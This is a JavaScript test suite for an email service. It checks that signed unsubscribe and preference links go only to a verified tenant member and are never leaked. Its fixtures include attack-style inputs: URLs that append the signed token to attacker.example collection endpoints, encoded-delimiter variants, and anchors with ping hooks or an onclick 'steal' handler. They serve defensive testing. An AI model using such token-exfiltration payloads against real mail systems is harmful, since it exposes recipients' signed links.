import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';

// In-memory database and transport only; no credentials or network clients.
const state = { payloads: [], queries: [], member: null, tenant: null, footer: null };
globalThis.__transactionalPreferenceFixture = state;
const moduleUrl = source => `data:text/javascript;base64,${Buffer.from(source).toString('base64')}`;
const dbUrl = moduleUrl(`
  const state = globalThis.__transactionalPreferenceFixture;
  export const supabase = { from(table) {
    const query = { table, filters: [] }; state.queries.push(query);
    const result = () => ({ data: table === 'member' ? state.member :
      table === 'tenant' ? state.tenant :
      table === 'system_settings' && query.filters.some(([key, value]) => key === 'setting_key' && value === 'email_footer_html') && state.footer ?
      { setting_value: state.footer } : null });
    const chain = {
      select() { return chain; },
      eq(...args) { query.filters.push(args); return chain; },
      ilike(...args) { query.filters.push(args); return chain; },
      limit() { return Promise.resolve(result()); },
      single() { return Promise.resolve(result()); },
      maybeSingle() { return Promise.resolve(result()); }
    }; return chain;
  }};
`);
let resolverSource = await readFile(new URL('./transactionalPreferences.js', import.meta.url), 'utf8');
resolverSource = resolverSource
  .replace("'parse5'", JSON.stringify(import.meta.resolve('parse5')))
  .replace("'./database.js'", JSON.stringify(dbUrl))
  .replace("'../email-preferences/index.js'", JSON.stringify(moduleUrl(`
    export const generateMemberPreferencesToken = (tenant, member) => 'signed-' + tenant + '-' + member;
  `)));
const resolverUrl = moduleUrl(resolverSource);
const footerLayoutUrl = moduleUrl(
  await readFile(new URL('./emailFooterLayout.js', import.meta.url), 'utf8'),
);
const campaignCompositionUrl = moduleUrl(
  await readFile(new URL('./campaignEmailComposition.js', import.meta.url), 'utf8'),
);
let serviceSource = await readFile(new URL('./emailService.js', import.meta.url), 'utf8');
serviceSource = serviceSource
  .replace("'mailgun.js'", JSON.stringify(moduleUrl(`
    export default class Mailgun { client() { return { messages: { create: async (domain, payload) => {
      globalThis.__transactionalPreferenceFixture.payloads.push(payload);
      return { id: 'mock-message' };
    }}}; }}
  `)))
  .replace("'form-data'", JSON.stringify(moduleUrl('export default class FormData {}')))
  .replace("'./database.js'", JSON.stringify(dbUrl))
  .replace("'./transactionalPreferences.js'", JSON.stringify(resolverUrl))
  .replace("'./transactionalInbox.js'", JSON.stringify(moduleUrl('export async function recordTransactionalInboxMessage() {}')))
  .replace("'./emailFooterLayout.js'", JSON.stringify(footerLayoutUrl))
  .replace("'./campaignEmailComposition.js'", JSON.stringify(campaignCompositionUrl))
  .replace('const MAILGUN_API_KEY = process.env.MAILGUN_API_KEY;', "const MAILGUN_API_KEY = 'fixture-only';");
const serviceUrl = moduleUrl(serviceSource);
const { sendEmail, replacePlaceholders } = await import(serviceUrl);
let tenantServiceSource = await readFile(new URL('./tenantEmailService.js', import.meta.url), 'utf8');
tenantServiceSource = tenantServiceSource
  .replace("'mailgun.js'", JSON.stringify(moduleUrl('export default class Mailgun {}')))
  .replace("'form-data'", JSON.stringify(moduleUrl('export default class FormData {}')))
  .replace("'./database.js'", JSON.stringify(dbUrl))
  .replace("'./emailService.js'", JSON.stringify(serviceUrl))
  .replace("'./transactionalPreferences.js'", JSON.stringify(resolverUrl))
  .replace("'./transactionalInbox.js'", JSON.stringify(moduleUrl('export async function recordTransactionalInboxMessage() {}')));
const { sendTenantEmail } = await import(moduleUrl(tenantServiceSource));
const tenantTransport = { messages: { create: async (domain, payload) => {
  state.payloads.push(payload);
  return { id: 'mock-tenant-message' };
} } };
let counter = 0;
function setup() {
  const tenantId = `tenant-${++counter}`;
  state.payloads = [];
  state.queries = [];
  state.member = [{ id: 'actual-recipient', tenant_id: tenantId, email: 'recipient@example.org' }];
  state.tenant = { id: tenantId, slug: 'trusted-tenant' };
  state.footer = null;
  return { tenantId, to: 'Recipient <recipient@example.org>', subject: 'Notice', skipFooter: true };
}
async function deliver(opts) {
  assert.equal((await sendEmail(opts)).success, true);
  assert.equal(state.payloads.length, 1);
  return state.payloads[0];
}

test('final transport resolves HTML, visual anchors, repeated case variants and explicit text for actual tenant recipient', async () => {
  const opts = setup();
  const payload = await deliver({
    ...opts,
    html: '<p>{{unsubscribe_link}} {{ UNSUBSCRIBE_URL }} {{communication_preferences_link}}</p><a href="{{unsubscribe_url}}">Unsubscribe</a>',
    text: '{{unsubscribe_link}} {{communication_preferences_url}}',
  });
  assert.match(payload.html, />Unsubscribe<\/a>/);
  assert.match(payload.html, />Manage communication preferences<\/a>/);
  assert.match(payload.html, /https:\/\/trusted-tenant\.[^/]+\/email-preferences\?t=signed-tenant-\d+-actual-recipient/);
  assert.doesNotMatch(payload.html + payload.text, /\{\{|<a[^>]*<a/);
  assert.match(payload.text, /signed-tenant-\d+-actual-recipient/);
  assert.ok(state.queries.find(q => q.table === 'member').filters.some(([key, value]) => key === 'tenant_id' && value === opts.tenantId));
});

test('final transport fails safe for missing, mismatched, ambiguous, cross-tenant and multi-recipient identities', async () => {
  for (const context of ['missing', 'mismatch', 'cross-tenant', 'ambiguous', 'multi', 'cc', 'bcc', 'system', 'origin']) {
    const opts = setup();
    if (context === 'missing') state.member = [];
    if (context === 'mismatch') state.member[0].email = 'other@example.org';
    if (context === 'cross-tenant') state.member[0].tenant_id = 'other';
    if (context === 'ambiguous') state.member.push({ ...state.member[0] });
    if (context === 'multi') opts.to = ['recipient@example.org', 'other@example.org'];
    if (context === 'cc') opts.cc = 'other@example.org';
    if (context === 'bcc') opts.bcc = ['other@example.org'];
    if (context === 'system') opts.systemEmail = true;
    if (context === 'origin') state.tenant.slug = 'attacker.example/path';
    const payload = await deliver({ ...opts, html: '<a href="{{unsubscribe_url}}">Unsubscribe</a> {{unsubscribe_link}}', text: '{{unsubscribe_url}}' });
    assert.doesNotMatch(payload.html + payload.text, /signed-|\{\{|href=/, context);
    assert.match(payload.html, /Communication preferences unavailable/, context);
  }
});

test('reserved tokens cannot be overwritten by workflow entity fields or early entity signing', () => {
  assert.equal(replacePlaceholders('{{unsubscribe_url}} {{communication_preferences_url}}', 'member', {
    unsubscribe_url: 'evil', communication_preferences_url: 'evil',
  }, { tenantBaseUrl: 'https://evil.example', memberId: 'unrelated', tenantId: 'other' }),
  '{{unsubscribe_url}} {{communication_preferences_url}}');
});

test('configured footer resolves after insertion and derived text preserves signed anchor URLs', async () => {
  const opts = setup();
  state.footer = '<p>Footer <a href="{{unsubscribe_url}}">{{unsubscribe_link}}</a></p>';
  const payload = await deliver({ ...opts, skipFooter: false, html: '<p>Essential notice</p>' });
  assert.match(payload.html, /Footer <a href="https:\/\/trusted-tenant\./);
  assert.match(payload.html, />Unsubscribe<\/a>/);
  assert.match(payload.text, /Unsubscribe \(https:\/\/trusted-tenant\.[^)]+signed-tenant-\d+-actual-recipient\)/);
  assert.doesNotMatch(payload.html + payload.text, /\{\{/);
});

test('already rendered external links remain untouched and campaign opt-out preserves payload and headers', async () => {
  let opts = setup();
  const rendered = '<a href="https://external.example/preferences?token=existing">Preferences</a>';
  let payload = await deliver({ ...opts, html: rendered });
  assert.equal(payload.html, rendered);
  assert.equal(state.queries.some(q => q.table === 'member'), false);
  opts = setup();
  payload = await deliver({ ...opts, html: '{{unsubscribe_link}}', text: 'original', resolveTransactionalPreferences: false, unsubscribeUrl: 'https://campaign.example/unsubscribe', enableTracking: true });
  assert.equal(payload.html, '{{unsubscribe_link}}');
  assert.equal(payload.text, 'original');
  assert.match(payload['h:List-Unsubscribe'], /https:\/\/campaign.example\/unsubscribe/);
  assert.equal(state.queries.some(q => q.table === 'member'), false);
});

test('independent tenant transport resolves template and explicit footer without loading configured footer', async () => {
  const opts = setup();
  state.footer = '<p>Configured footer must not be loaded</p>';
  const result = await sendTenantEmail({
    ...opts,
    mailgunClient: tenantTransport,
    html: '<p>{{UNSUBSCRIBE_LINK}}</p>',
    footer: '<p>Explicit footer <a href="{{communication_preferences_url}}">Preferences</a></p>',
    text: '{{unsubscribe_url}} {{communication_preferences_link}}',
  });
  assert.equal(result.success, true);
  const payload = state.payloads[0];
  assert.match(payload.html, /Unsubscribe<\/a>/);
  assert.match(payload.html, /Explicit footer/);
  assert.doesNotMatch(payload.html + payload.text, /\{\{|Configured footer/);
  assert.match(payload.text, /signed-tenant-\d+-actual-recipient/);
  assert.equal(state.queries.some(q => q.table === 'system_settings'), false);
});

test('independent tenant transport keeps derived URLs and safely handles unsafe recipient envelopes', async () => {
  for (const context of ['valid', 'missing', 'foreign', 'multi', 'cc', 'bcc']) {
    const opts = setup();
    if (context === 'missing') state.member = [];
    if (context === 'foreign') state.member[0].tenant_id = 'different-tenant';
    if (context === 'multi') opts.to = ['recipient@example.org', 'other@example.org'];
    if (context === 'cc') opts.cc = 'other@example.org';
    if (context === 'bcc') opts.bcc = 'other@example.org';
    const result = await sendTenantEmail({
      ...opts, mailgunClient: tenantTransport, html: '<p>Essential notice</p>',
      footer: '<a href="{{unsubscribe_url}}">Unsubscribe</a> {{communication_preferences_link}}',
    });
    assert.equal(result.success, true);
    const payload = state.payloads[0];
    assert.doesNotMatch(payload.html + payload.text, /\{\{/);
    if (context === 'valid') {
      assert.match(payload.text, /Unsubscribe \(https:\/\/trusted-tenant\./);
    } else {
      assert.doesNotMatch(payload.html + payload.text, /signed-|href=/, context);
      assert.match(payload.text, /Communication preferences unavailable/, context);
    }
  }
});

test('independent tenant transport preserves existing footer and already-rendered external links verbatim', async () => {
  const opts = setup();
  const html = '<p>Original body</p>';
  const footer = '<a href="https://external.example/preferences?token=existing">Preferences</a>';
  const result = await sendTenantEmail({ ...opts, html, footer, mailgunClient: tenantTransport });
  assert.equal(result.success, true);
  assert.equal(state.payloads[0].html, html + footer);
  assert.equal(state.queries.some(q => q.table === 'member'), false);
});

test('final transports never sign aliases inside raw-text, RCDATA, foreign or inert HTML contexts', async () => {
  for (const tag of ['style', 'script', 'textarea', 'title', 'xmp', 'iframe', 'noembed', 'noframes', 'noscript', 'plaintext', 'template', 'svg', 'math']) {
    for (const tenantTransportMode of [false, true]) {
      const opts = setup();
      const html = `<${tag}>url(https://attacker.example/collect?data={{unsubscribe_url}}) {{communication_preferences_link}}</${tag}>`;
      const result = tenantTransportMode
        ? await sendTenantEmail({ ...opts, html, mailgunClient: tenantTransport })
        : await sendEmail({ ...opts, html });
      assert.equal(result.success, true);
      const payload = state.payloads[0];
      assert.doesNotMatch(payload.html + payload.text, /signed-|\{\{/, `${tag}, tenant=${tenantTransportMode}`);
      assert.match(payload.html, /Communication preferences unavailable/);
    }
  }
});

test('final payloads reject URL aliases concatenated into attacker-controlled URL text and encoded delimiters', async () => {
  const fragments = [
    'https://attacker.example/?data={{unsubscribe_url}}',
    'https://attacker.example/?data={{unsubscribe_link}}',
    '//attacker.example/{{communication_preferences_url}}',
    'https://attacker.example/?data=({{unsubscribe_url}})',
    'https://attacker.example/?data=%20{{unsubscribe_url}}',
    'https://attacker.example/?data=&#32;{{unsubscribe_url}}',
    'https://attacker.example/?data=&#x200b;{{unsubscribe_url}}',
    '{{unsubscribe_url}}@attacker.example',
    '{{unsubscribe_url}}.attacker.example',
    '<span>https://attacker.example/?data=</span>{{unsubscribe_url}}',
    'https://attacker.example/?data=<span>{{unsubscribe_url}}</span>',
  ];
  for (const fragment of fragments) {
    const opts = setup();
    const payload = await deliver({ ...opts, html: `<p>${fragment}</p>`, text: fragment });
    assert.doesNotMatch(payload.html + payload.text, /signed-|\{\{/, fragment);
  }
});

test('standalone URL blocks and plaintext still resolve while generated hrefs cannot retain ping hooks', async () => {
  const opts = setup();
  const payload = await deliver({
    ...opts,
    html: '<p>{{unsubscribe_url}}</p><a href="{{unsubscribe_url}}" ping="https://attacker.example" onclick="steal(this.href)">Unsubscribe</a>',
    text: 'Preferences:\n{{unsubscribe_url}}\n',
  });
  assert.match(payload.html, /signed-tenant-\d+-actual-recipient/);
  assert.match(payload.text, /signed-tenant-\d+-actual-recipient/);
  assert.doesNotMatch(payload.html, /ping=|onclick=/);
});